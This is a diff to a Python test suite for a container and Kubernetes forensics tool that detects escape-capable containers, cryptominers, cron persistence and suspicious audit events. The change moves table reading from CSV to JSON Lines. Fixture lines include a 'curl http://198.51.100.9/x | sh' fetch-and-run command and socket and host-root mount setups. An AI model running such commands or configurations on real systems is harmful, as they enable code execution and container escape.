@@ -9,6 +9,7 @@ from pathlib import Path
 # Appended, not prepended: src/analysis/platform would shadow the stdlib module.
 sys.path.append(str(Path(__file__).resolve().parents[2] / "src" / "analysis"))
 
+from rowanholt.core.records import check_file, own_fields, read_records  # noqa: E402
 from rowanholt.collect import linux as collect  # noqa: E402
 from rowanholt.process import linux_artefacts as la  # noqa: E402
 from rowanholt.process.extractions import bbolt, containers, k8s_audit  # noqa: E402
@@ -29,8 +30,11 @@ def run(out, artefact):
 
 
 def rows(out, name):
-    with open(Path(out) / "HOST" / "artefacts" / "cooked" / name, newline="") as fh:
-        return list(csv.DictReader(fh))
+    """A cooked table's rows as Elrond wrote them (JSON Lines), without the envelope; every record
+    checked for it first."""
+    path = Path(out) / "HOST" / "artefacts" / "cooked" / f"{name}.jsonl"
+    assert check_file(path) == []
+    return [own_fields(r) for _, r in read_records(path)]
 
 
 def techniques(out):
@@ -60,7 +64,7 @@ def test_escape_capable_container(tmp_path):
     out, linux = host(tmp_path)
     assert run(out, docker_config(linux, True, ["/var/run/docker.sock:/var/run/docker.sock", "/:/host:ro"]))
     assert run(out, linux / flat(f"/var/lib/docker/containers/{CID}/hostconfig.json"))  # read with the config
-    (row,) = rows(out, "docker_containers.csv")
+    (row,) = rows(out, "docker_containers")
     assert row["Container"] == CID[:12] and row["Image"] == "alpine:3.20" and row["User"] == "root"
     assert row["Runtime"] == "docker"
     for flag in ("privileged", "container runtime socket mounted (/var/run/docker.sock)",
@@ -72,7 +76,7 @@ def test_escape_capable_container(tmp_path):
 def test_ordinary_container_is_not_a_finding(tmp_path):
     out, linux = host(tmp_path)
     run(out, docker_config(linux, False, ["/srv/app/data:/data"], command="nginx -g daemon off;"))
-    (row,) = rows(out, "docker_containers.csv")
+    (row,) = rows(out, "docker_containers")
     assert row["Flag"] == "" and techniques(out) == []
 
 
@@ -84,7 +88,7 @@ def test_container_logs(tmp_path):
     pod.write_text("2026-10-20T09:01:00.123Z stderr F curl http://198.51.100.9/x | sh\n")
     run(out, log)
     run(out, pod)
-    docker, cri = rows(out, "container_logs.csv")
+    docker, cri = rows(out, "container_logs")
     assert docker["Runtime"] == "docker" and docker["Message"] == "connecting to pool"
     assert (cri["Namespace"], cri["Pod"], cri["Container"], cri["Stream"]) == ("payments", "api-7d9f", "api", "stderr")
 
@@ -98,7 +102,7 @@ def test_writable_layer_changes(tmp_path):
                        "4f1c9e2ab3d7,/etc/cron.d/update,10,0o644,,,1792000000\n"
                        "4f1c9e2ab3d7,/var/cache/apk/APKINDEX,10,0o644,,,1792000000\n")
     run(out, listing)
-    found = {r["Path"]: r["Flag"] for r in rows(out, "container_changes.csv")}
+    found = {r["Path"]: r["Flag"] for r in rows(out, "container_changes")}
     assert found["/tmp/.x/xmrig"] == "executable in a temporary or hidden path"
     assert found["/etc/cron.d/update"] == "cron changed"
     assert found["/var/cache/apk/APKINDEX"] == ""
@@ -117,7 +121,7 @@ def test_static_pods(tmp_path):
     run(out, linux / flat("/etc/kubernetes/manifests/kube-apiserver.yaml"))
     assert techniques(out) == []
     run(out, linux / flat("/etc/kubernetes/manifests/node-agent.yaml"))
-    agent = [r for r in rows(out, "static_pods.csv") if r["Name"] == "node-agent"][0]
+    agent = [r for r in rows(out, "static_pods") if r["Name"] == "node-agent"][0]
     assert agent["Flag"] == "not a control-plane pod; privileged; host PID namespace; host path /"
     assert techniques(out) == ["T1543.005", "T1611"]
 
@@ -145,7 +149,7 @@ def test_kubernetes_audit_log(tmp_path):
     ]
     log.write_text("\n".join(json.dumps(e) for e in events) + "\n")
     run(out, log)
-    found = [(r["User"], r["Flag"], r["Technique"]) for r in rows(out, "k8s_audit.csv")]
+    found = [(r["User"], r["Flag"], r["Technique"]) for r in rows(out, "k8s_audit")]
     assert len(found) == 7  # RequestReceived is the same request again
     assert found[0][1] == ""  # a controller creating pods is Kubernetes doing its job
     assert ("mallory", "secrets read", "T1552.007") in found
@@ -203,7 +207,7 @@ def test_containerd_metadata(tmp_path):
     copy = linux / flat("/var/lib/containerd/io.containerd.metadata.v1.bolt/meta.db")
     copy.write_bytes(META_DB.read_bytes())
     assert run(out, copy)
-    found = {r["Container"]: r for r in rows(out, "docker_containers.csv")}
+    found = {r["Container"]: r for r in rows(out, "docker_containers")}
     assert set(found) == {"lab-escape", "lab-web", "9b2e7c41d0a8"}
     escape = found["lab-escape"]
     assert (escape["Runtime"], escape["Name"], escape["Image"], escape["User"]) == \
@@ -231,7 +235,7 @@ def test_podman_state(tmp_path):
                        ("bolt_state.db", "/var/lib/containers/storage/libpod/bolt_state.db")):
         (linux / flat(path)).write_bytes((PODMAN / name).read_bytes())
         assert run(out, linux / flat(path))
-    found = rows(out, "docker_containers.csv")
+    found = rows(out, "docker_containers")
     assert len(found) == 6 and {r["Runtime"] for r in found} == {"podman"}
     for name in ("lab-escape", "lab-web", "lab-sock"):
         flags = {r["Flag"] for r in found if r["Name"] == name}
@@ -307,18 +311,18 @@ def test_lab_seed_end_to_end(tmp_path):
     collect.collect_linux_extras(str(mnt), str(raw) + "/", "HOST::Linux", out, "collecting", 0)
     for artefact in sorted((raw / "linux").iterdir()):
         run(out, artefact)
-    (container,) = [r for r in rows(out, "docker_containers.csv") if r["Runtime"] == "docker"]
+    (container,) = [r for r in rows(out, "docker_containers") if r["Runtime"] == "docker"]
     assert "container runtime socket mounted" in container["Flag"] and "host path mounted read-write (/)" in container["Flag"]
-    escape = next(r for r in rows(out, "docker_containers.csv") if r["Container"] == "lab-escape")
+    escape = next(r for r in rows(out, "docker_containers") if r["Container"] == "lab-escape")
     assert escape["Runtime"] == "containerd" and "host PID namespace" in escape["Flag"]
-    sock = next(r for r in rows(out, "docker_containers.csv") if r["Name"] == "lab-sock")
+    sock = next(r for r in rows(out, "docker_containers") if r["Name"] == "lab-sock")
     assert sock["Runtime"] == "podman" and "/run/podman/podman.sock" in sock["Flag"]
-    assert any("c2.rivendell-lab.test" in r["Message"] for r in rows(out, "container_logs.csv"))
-    changes = {r["Path"]: r["Flag"] for r in rows(out, "container_changes.csv")}
+    assert any("c2.rivendell-lab.test" in r["Message"] for r in rows(out, "container_logs"))
+    changes = {r["Path"]: r["Flag"] for r in rows(out, "container_changes")}
     assert changes["/tmp/.x/lab-miner"] == "executable in a temporary or hidden path"
     assert changes["/etc/cron.d/lab-miner"] == "cron changed"
-    assert [r["Name"] for r in rows(out, "static_pods.csv")] == ["lab-node-agent"]
-    audit = {r["Flag"] for r in rows(out, "k8s_audit.csv")}
+    assert [r["Name"] for r in rows(out, "static_pods")] == ["lab-node-agent"]
+    audit = {r["Flag"] for r in rows(out, "k8s_audit")}
     assert {"secrets read", "exec into a pod", "role binding created to cluster-admin"} <= audit
     assert {"T1611", "T1610", "T1105", "T1053.003", "T1543.005", "T1552.007", "T1609", "T1098.006"} <= set(techniques(out))
 
@@ -339,7 +343,7 @@ def test_rootless_podman_is_collected_from_each_home_and_marked_with_its_user(tm
     assert collected == ["alice+bolt_state.db", "alice+db.sql"]
     for name in collected:
         assert run(out, raw / "user_profiles" / name)
-    found = rows(out, "docker_containers.csv")
+    found = rows(out, "docker_containers")
     assert len(found) == 6 and {r["Runtime"] for r in found} == {"podman (rootless, alice)"}
     assert "privileged" in next(r for r in found if r["Name"] == "lab-escape")["Flag"]
     assert techniques(out) == ["T1610", "T1611"]
